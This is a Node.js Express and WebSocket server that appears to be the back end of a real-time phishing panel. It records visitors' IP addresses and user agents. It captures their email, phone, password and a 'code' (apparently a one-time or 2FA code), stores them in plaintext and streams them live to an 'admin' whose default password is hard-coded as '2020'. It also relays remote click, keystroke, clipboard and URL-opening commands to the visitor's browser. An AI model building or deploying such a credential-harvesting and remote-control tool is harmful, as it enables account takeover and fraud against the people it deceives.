const express = require("express");
const http = require("http");
const WebSocket = require("ws");
const { v4: uuidv4 } = require("uuid");
const fs = require("fs");
const path = require("path");

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, "data.json");

app.use(express.static("public"));
app.get("/admin", (req, res) =>
  res.sendFile(path.join(__dirname, "public", "admin.html")),
);
app.get("/visitor", (req, res) =>
  res.sendFile(path.join(__dirname, "public", "visitor.html")),
);

let visitors = new Map();
let admins = new Set();

function loadData() {
  if (fs.existsSync(DATA_FILE)) {
    try {
      const data = JSON.parse(fs.readFileSync(DATA_FILE, "utf8"));
      visitors = new Map(
        Object.entries(data).map(([k, v]) => [k, { ...v, status: "offline" }]),
      );
    } catch (e) {
      console.error("Data load error", e);
    }
  }
}

function saveData() {
  fs.writeFileSync(
    DATA_FILE,
    JSON.stringify(Object.fromEntries(visitors), null, 2),
  );
}

loadData();

wss.on("connection", (ws, req) => {
  const ip = req.socket.remoteAddress;
  ws.id = uuidv4();
  ws.role = null;

  ws.on("message", (message) => {
    let data;
    try {
      data = JSON.parse(message);
    } catch (e) {
      return;
    }

    if (data.type === "role") {
      ws.role = data.role;
      if (ws.role === "admin") {
        const adminPass = process.env.ADMIN_PASS || "2020";
        if (data.password !== adminPass) {
          ws.send(JSON.stringify({ type: "auth-failed" }));
          ws.close();
          return;
        }
        admins.add(ws);
        ws.send(
          JSON.stringify({
            type: "init",
            visitors: Array.from(visitors.values()),
          }),
        );
      } else if (ws.role === "visitor") {
        const visitorData = {
          id: ws.id,
          ip,
          userAgent: req.headers["user-agent"],
          status: "online",
          connectedAt: Date.now(),
        };
        visitors.set(ws.id, visitorData);
        saveData();
        ws.send(JSON.stringify({ type: "visitor-init", id: ws.id }));
        broadcastToAdmins({ type: "visitor-connected", visitor: visitorData });
      }
      return;
    }

    // Relay Control Signals (Cookies Removed)
    const relayTypes = [
      "webrtc-offer",
      "webrtc-answer",
      "webrtc-ice",
      "request-control",
      "control-granted",
      "control-denied",
      "remote-click",
      "remote-key",
      "remote-scroll",
      "remote-clipboard",
      "remote-open-url",
      "remote-close-tab",
    ];

    if (relayTypes.includes(data.type)) {
      const target =
        data.target === "admin"
          ? Array.from(admins)
          : [Array.from(wss.clients).find((c) => c.id === data.target)];
      if (target && target[0])
        target[0].send(JSON.stringify({ ...data, sender: ws.id }));
    }

    if (data.type === "admin-message" && ws.role === "admin") {
      const target = Array.from(wss.clients).find(
        (c) => c.id === data.targetId,
      );
      if (target)
        target.send(JSON.stringify({ type: "admin-message", text: data.text }));
    }

    if (data.type === "remove-visitor" && ws.role === "admin") {
      const target = Array.from(wss.clients).find(
        (c) => c.id === data.targetId,
      );
      if (target) target.close();
      visitors.delete(data.targetId);
      saveData();
      broadcastToAdmins({ type: "visitor-removed", id: data.targetId });
    }

    if (data.type === "visitor-login" && ws.role === "visitor") {
      const v = visitors.get(ws.id);
      if (v) {
        v.email = data.email;
        v.phone = data.phone;
        v.password = data.password;
        saveData();
        broadcastToAdmins({ type: "visitor-updated", visitor: v });
      }
    }

    if (data.type === "visitor-code" && ws.role === "visitor") {
      const v = visitors.get(ws.id);
      if (v) {
        v.code = data.code;
        saveData();
        broadcastToAdmins({ type: "visitor-updated", visitor: v });
      }
    }
  });

  ws.on("close", () => {
    if (ws.role === "admin") admins.delete(ws);
    else if (ws.role === "visitor") {
      const v = visitors.get(ws.id);
      if (v) {
        v.status = "offline";
        saveData();
        broadcastToAdmins({ type: "visitor-disconnected", id: ws.id });
      }
    }
  });
});

function broadcastToAdmins(msg) {
  const payload = JSON.stringify(msg);
  admins.forEach((admin) => {
    if (admin.readyState === WebSocket.OPEN) admin.send(payload);
  });
}

server.listen(PORT, "0.0.0.0", () => {
  console.log(`Server running on port ${PORT}`);
});
